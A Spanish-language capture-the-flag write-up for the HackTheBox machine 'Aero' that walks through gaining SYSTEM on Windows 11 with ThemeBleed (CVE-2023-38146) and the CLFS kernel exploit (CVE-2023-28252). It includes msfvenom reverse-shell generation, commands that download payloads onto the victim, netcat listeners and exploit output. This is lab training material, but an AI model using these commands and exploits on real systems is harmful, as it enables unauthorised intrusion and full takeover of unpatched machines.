---
title: Aero - HackTheBox
---

## 1. Reconocimiento

### Escaneo de puertos

```jsx
nmap -p- -vvv --min-rate 10000 10.129.229.128

PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 127
```

```jsx
nmap -sSCV -Pn 10.129.229.128

`PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 10.0
|_http-title: Aero Theme Hub
|_http-server-header: Microsoft-IIS/10.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

### Enumeración del servicio web

```jsx
echo "10.129.229.128 aero.htb" | sudo tee -a /etc/hosts
```

> El sitio se llama **Aero Theme Hub** — un portal para subir archivos `.themepack` de Windows. Esto apunta directamente a **CVE-2023-38146 (ThemeBleed)**.
> 

---

## 2. Vector de entrada — CVE-2023-38146 (ThemeBleed)

**ThemeBleed** es una vulnerabilidad en el mecanismo de verificación de versiones de archivos `.msstyles` dentro de un `.themepack`. Cuando Windows procesa un themepack con versión `999`, carga una DLL de verificación (`_vrf.dll`) desde una ruta UNC controlable por el atacante. Si esa ruta apunta a un servidor SMB malicioso, Windows carga una DLL arbitraria con los permisos del usuario que aplica el tema, logrando RCE.

**Flujo del ataque:**

1. Se genera un `.themepack` malicioso que apunta a nuestro servidor SMB
2. El usuario (o la aplicación web) abre el themepack
3. Windows contacta nuestro SMB para cargar la DLL de verificación
4. Se sirve una DLL con reverse shell → ejecución de código

### Paso 1 — Preparar listener

```jsx
rlwrap -cAr nc -lvnp 4712
```

### Paso 2 — Generar themepack malicioso y levantar servidor SMB

```jsx
git clone https://github.com/Jnnshschl/CVE-2023-38146
cd CVE-2023-38146
python3 themebleed.py -r 10.10.14.187 -p 4712

INFO> ThemeBleed CVE-2023-38146 PoC
INFO> Compiled DLL: "./tb/Aero.msstyles_vrf_evil.dll"
INFO> Theme generated: "evil_theme.theme"
INFO> Themepack generated: "evil_theme.themepack"
INFO> Remember to start netcat: rlwrap -cAr nc -lvnp 4712
INFO> Starting SMB server: 10.10.14.187:445
INFO> Incoming connection (10.129.229.128,52825)
INFO> AUTHENTICATE_MESSAGE (AERO\sam.emerson,AERO)
INFO> User AERO\sam.emerson authenticated successfully
WARNING> Stage 1/3: "Aero.msstyles" [shareAccess: 1]
WARNING> Stage 2/3: "Aero.msstyles_vrf.dll" [shareAccess: 7]
WARNING> Stage 3/3: "Aero.msstyles_vrf.dll" [shareAccess: 5]
```

> El script genera el themepack, levanta el servidor SMB y espera la conexión. Una vez que la web procesa el archivo subido, Windows contacta nuestro SMB y carga la DLL maliciosa.
> 

---

## 3. Acceso inicial

```jsx
rlwrap -cAr nc -lvnp 4712

listening on [any] 4712 ...
connect to [10.10.14.187] from (UNKNOWN) [10.129.229.128] 52826
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\system32>
```

```jsx
type C:\Users\sam.emerson\Desktop\user.txt

[user root]
```

### Enumeración post-acceso

```jsx
whoami /all

User Name        SID
================ ==============================================
aero\sam.emerson S-1-5-21-3555993375-1320373569-1431083245-1001

PRIVILEGES INFORMATION
Privilege Name                Description                          State
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disable
```

```jsx
systeminfo

OS Name:     Microsoft Windows 11 Pro N
OS Version:  10.0.22000 N/A Build 22000
Hotfix(s):   7 Hotfix(s) Installed.
             KB5004342, KB5010690, KB5012170, KB5026038,
             KB5026910, KB5023774, KB5029782
```

> Build `22000.1761` — Windows 11 21H2. Solo 7 hotfixes instalados. El usuario no tiene privilegios especiales, pero al inspeccionar los documentos aparece una pista directa.
> 

powershell

```jsx
ls C:\Users\sam.emerson\Documents

Mode     LastWriteTime    Length Name
----     -------------    ------ ----
-a----   9/21/2023 9:18AM  14158 CVE-2023-28252_Summary.pdf
-a----   9/26/2023 1:06PM   1113 watchdog.ps1
```

> El PDF `CVE-2023-28252_Summary.pdf` en el escritorio indica directamente qué CVE usar para la escalada.
> 

---

## 4. Escalada de privilegios — CVE-2023-28252 (CLFS Kernel EoP)

**CVE-2023-28252** es una vulnerabilidad de escalada de privilegios en el driver `clfs.sys` (Common Log File System) del kernel de Windows. Mediante una corrupción controlada de estructuras internas del CLFS, el exploit captura el token de `SYSTEM` y lo asigna al proceso actual, elevando al atacante a `NT AUTHORITY\SYSTEM` sin necesidad de ningún privilegio previo.

Afecta a Windows 10/11 y Windows Server sin el parche de abril 2023 (KB5025221).

### Paso 1 — Preparar los binarios en el atacante

```jsx
# Descargar el PoC precompilado
wget "https://github.com/bkstephen/Compiled-PoC-Binary-For-CVE-2023-28252/raw/main/x64/Release/clfs_eop.exe"

# Generar reverse shell con msfvenom
msfvenom -p windows/x64/shell_reverse_tcp \
  LHOST=10.10.14.187 \
  LPORT=9001 \
  -f exe \
  -o shell.exe`

`Payload size: 460 bytes
Final size of exe file: 7680 bytes
Saved as: shell.exe
```

```jsx
# Servidor HTTP para transferir los binarios
python3 -m http.server 8081
```

### Paso 2 — Descargar los binarios en la víctima

```jsx
Invoke-WebRequest -Uri "http://10.10.14.187:8081/clfs_eop.exe" -OutFile "C:\Users\sam.emerson\Desktop\clfs_eop.exe"
Invoke-WebRequest -Uri "http://10.10.14.187:8081/shell.exe" -OutFile "C:\Users\sam.emerson\Desktop\shell.exe"
```

### Paso 3 — Listener para la shell de SYSTEM

```jsx
rlwrap -cAr nc -lvnp 9001
```

### Paso 4 — Ejecutar el exploit

powershell

```jsx
cd C:\Users\sam.emerson\Desktop
.\clfs_eop.exe C:\Users\sam.emerson\Desktop\shell.exe

[+] TOKEN OFFSET 4b8
[+] FLAG 1
[+] NtFsControlFile Address --> 00007FFA39C24240
[+] MY EPROCESS FFFF8987A7DA2080
[+] SYSTEM EPROCESS FFFF8987A2AC5040
[+] Offset ClfsEarlierLsn --> 0000000000013220
[+] Kernel ClfsEarlierLsn --> FFFFF80062213220
TRIGGER START
System_token_value: FFFFB70BDEE41599
SYSTEM TOKEN CAPTURED
Closing Handle
ACTUAL USER=SYSTEM
```

---

## 5. Shell como SYSTEM y flag de root

```jsx
listening on [any] 9001 ...
connect to [10.10.14.187] from (UNKNOWN) [10.129.229.128] 52833
Microsoft Windows [Version 10.0.22000.1761]

C:\Users\sam.emerson\Desktop> whoami
nt authority\system
```

```jsx
type C:\Users\Administrator\Desktop\root.txt

[flag root]
```

---



---

## 7. Lecciones aprendidas

- **Funcionalidades de upload con procesamiento del lado servidor son de alto riesgo.** Un portal que "aplica" archivos de tema es tan peligroso como uno que ejecuta código — Windows lo procesa igual.
- **ThemeBleed (CVE-2023-38146) abusa del mecanismo de carga de DLLs de verificación.** La clave es la versión `999` en el `.msstyles` — sin ese valor, Windows no carga la DLL externa. Siempre revisar si un servicio web procesa archivos que Windows interpreta nativamente.
- **CLFS (CVE-2023-28252) no requiere privilegios previos.** Desde una cuenta estándar sin ningún `SeImpersonatePrivilege` ni nada especial, el exploit llega a SYSTEM via corrupción de kernel. El vector es el build del OS sin parchear.
- **Los archivos en el sistema son pistas de privesc.** El PDF `CVE-2023-28252_Summary.pdf` en los documentos del usuario era una señal directa del camino correcto — siempre enumerar `Documents`, `Desktop`, `Downloads`.
- **En máquinas similares buscar:** portales de upload que procesen archivos nativos de Windows (`.theme`, `.themepack`, `.msi`, `.lnk`), build numbers sin parchear para buscar CVEs de kernel, archivos PDF/TXT en directorios de usuario que mencionen CVEs.